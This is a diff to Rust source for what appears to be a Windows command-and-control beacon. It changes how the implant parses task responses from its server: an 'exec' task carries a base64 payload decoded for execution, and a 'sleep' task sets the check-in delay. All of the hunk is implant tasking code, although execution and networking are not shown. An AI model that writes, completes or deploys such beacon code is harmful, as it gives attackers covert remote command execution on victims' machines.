@@ -131,26 +131,31 @@ impl Beacon {
         // task name is separated from payload with \r\n
         let colon_index = resp
             .body
-            .chars()
-            .position(|b| b == ':')
+            .iter()
+            .position(|&b| b == b':')
             .expect("bad task response format");
 
-        let (task_name, payload) = resp.body.split_at(colon_index);
+        let (task_name_bytes, payload_bytes) = resp.body.split_at(colon_index);
 
         // skip the colon
-        let payload = &payload[1..];
+        let payload_bytes = &payload_bytes[1..];
+
+        let task_name = String::from_utf8_lossy(task_name_bytes)
+            .trim()
+            .to_lowercase();
+        let payload_str = String::from_utf8_lossy(payload_bytes);
 
         // decode base64 payload if present
-        let task = match task_name {
+        let task = match task_name.as_str() {
             "exec" => {
                 let decoded = BASE64_STANDARD
-                    .decode(payload.as_bytes())
+                    .decode(payload_str.as_bytes())
                     .map_err(|_| windows::core::Error::from_win32())?;
                 Task::Exec(decoded)
             }
             "sleep" => {
                 let decoded = BASE64_STANDARD
-                    .decode(payload.as_bytes())
+                    .decode(payload_str.as_bytes())
                     .map_err(|_| windows::core::Error::from_win32())?;
                 let millis_str = String::from_utf8_lossy(&decoded);
                 let millis: u64 = millis_str
